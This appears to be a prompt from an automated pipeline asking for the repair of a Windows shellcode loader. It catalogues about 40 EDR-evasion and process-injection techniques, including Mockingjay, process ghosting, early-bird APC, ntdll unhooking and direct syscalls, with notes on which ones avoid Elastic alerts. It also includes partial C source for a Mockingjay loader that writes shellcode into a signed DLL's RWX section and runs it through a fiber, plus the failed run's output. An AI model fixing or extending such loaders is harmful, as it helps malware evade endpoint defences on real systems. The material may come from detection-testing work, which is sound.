@@ -1,0 +1,225 @@
+# Code Correction Task (Execution Failure)
+
+## Available Evasion Techniques (Reference)
+You may switch to a different technique if the current one is fundamentally broken.
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local**: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay** [USER-PREFERRED]: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **mockingjay**
+
+## Context
+The code compiled but failed during execution (crash, early exit, or shellcode loading failure).
+
+## Previous Code (C source that failed at runtime)
+```c
+// Mockingjay loader - x64 Windows, MSVC
+// Reads shellcode from argv[1], locates an RWX section in a signed DLL,
+// writes shellcode there, executes it via a fiber (no CreateThread).
+//
+// Build:  cl /W3 /O2 mockingjay.c
+//
+// Usage:  loader.exe C:\path\to\calc.bin
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* ------------------------------------------------------------------ */
+/* Helpers                                                             */
+/* ------------------------------------------------------------------ */
+
+/* Return pointer to the first section header of a PE image mapped at base. */
+static PIMAGE_SECTION_HEADER FirstSection(BYTE *base)
+{
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    return IMAGE_FIRST_SECTION(nt);
+}
+
+/* Inspect a PE file on disk (mapped read-only) and return the size of the
+   largest section that is both EXECUTE and WRITE. Returns 0 if none. */
+static SIZE_T LargestRwxSectionOnDisk(const wchar_t *path)
+{
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    HANDLE hMap  = NULL;
+    BYTE  *view  = NULL;
+    SIZE_T best  = 0;
+
+    hFile = CreateFileW(path, GENERIC_READ,
+                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return 0;
+
+    hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+    if (!hMap) goto done;
+
+    view = (BYTE *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+    if (!view) goto done;
+
+    __try {
+        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)view;
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto done;
+        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(view + dos->e_lfanew);
+        if (nt->Signature != IMAGE_NT_SIGNATURE) goto done;
+
+        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+        WORD n = nt->FileHeader.NumberOfSections;
+        for (WORD i = 0; i < n; ++i) {
+            DWORD ch = sec[i].Characteristics;
+            if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) {
+                SIZE_T sz = sec[i].Misc.VirtualSize;
+                if (sz == 0) sz = sec[i].SizeOfRawData;
+                if (sz > best) best = sz;
+            }
+        }
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        best = 0;
+    }
+
+done:
+    if (view) UnmapViewOfFile(view);
+    if (hMap) CloseHandle(hMap);
+    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
+    return best;
+}
+
+/* Search System32 and PATH for a DLL that contains an RWX section large
+   enough for `need` bytes. Writes the chosen path into out (MAX_PATH). */
+static BOOL FindRwxDll(SIZE_T need, wchar_t *out, SIZE_T outChars)
+{
+    wchar_t sysdir[MAX_PATH] = {0};
+    UINT n = GetSystemDirectoryW(sysdir, MAX_PATH);
+    if (n == 0 || n >= MAX_PATH) return FALSE;
+
+    /* Build a list of directories to scan: System32 first, then PATH. */
+    const wchar_t *dirs[64];
+    int dirCount = 0;
+    dirs[dirCount++] = sysdir;
+
+    static wchar_t pathBuf[32768];
+    DWORD plen = GetEnvironmentVariableW(L"PATH", pathBuf, 32768);
+    if (plen > 0 && plen < 32768) {
+        wchar_t *ctx = NULL;
+        wchar_t *tok = wcstok_s(pathBuf, L";", &ctx);
+        while (tok && dirCount < 63) {
+            if (tok[0] != L'\0') dirs[dirCount++] = tok;
+            tok = wcstok_s(NULL, L";", &ctx);
+        }
+    }
+
+    for (int d = 0; d < dirCount; ++d) {
+        wchar_t pattern[MAX_PATH * 2];
+        _snwprintf_s(pattern, _countof(pattern), _TRUNCATE,
+                     L"%ls\\*.dll", dirs[d]);
+
+        WIN32_FIND_DATAW fd;
+        HANDLE hFind = FindFirstFileW(pattern, &fd);
+        if (hFind == INVALID_HANDLE_VALUE) continue;
+
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+
+            wchar_t full[MAX_PATH * 2];
+            _snwprintf_s(full, _countof(full), _TRUNCATE,
+                         L"%ls\\%ls", dirs[d], fd.cFileName);
+
+            SIZE_T rwx = LargestRwxSectionOnDisk(full);
+            if (rwx >= need) {
+                wcsncpy_s(out, outChars, full, _TRUNCATE);
+                FindClose(hFind);
+                return TRUE;
+            }
+        } while (FindNextFileW(hFind, &fd));
+
+        FindClose(hFind);
+    }
+
+    return FALSE;
+}
+
+/* In a live loaded image, return the base address and usable size of the
+   first section whose characteristics contain EXECUTE|WRITE. */
+static void FindLiveRwxSection(HMODULE mod, BYTE **outAddr, SIZE_T *outSize)
+{
+    BYTE *base = (BYTE *)mod;
+    PIMAGE_SECTION_HEADER sec = FirstSection(base);
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    WORD n = nt->FileHeader.NumberOfSections;
+
+    for (WORD i = 0; i < n; ++i) {
+        DWORD ch = sec[i].Characteristics;
+        if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) {
+            SIZE_T sz = 
+
+... (truncated)
+```
+
+## Execution Output
+EXECUTION FAILED:
+[-] no DLL with an RWX section large enough was found.
+    Mockingjay requires a candidate (e.g. msys-2.0.dll).
+    Refusing to fall back to VirtualProtect.
+
+
+EXIT_CODE: 3
+
+SUCCESS_DETAILS: {'process_expected': 'calc.exe', 'message': 'Process calc.exe was NOT spawned by this loader within 15s'}
+
+STDOUT:
+[*] shellcode: 276 bytes
+
+
+STDERR:
+[-] no DLL with an RWX section large enough was found.
+    Mockingjay requires a candidate (e.g. msys-2.0.dll).
+    Refusing to fall back to VirtualProtect.
+
+
+## Task
+1. Analyze the runtime behavior.
+2. Identify the logical flaw or crash reason.
+3. Propose a fix to ensure successful execution (shellcode injection and thread start).
+
+## Output Format
+**Analysis**: [Explain the runtime failure]
+**Rule_Analysis**: N/A (Execution Error)
+**Technique**: BugFix
+**Methodology**: [Specific fix, e.g. "Fix memory alignment in VirtualAlloc"]
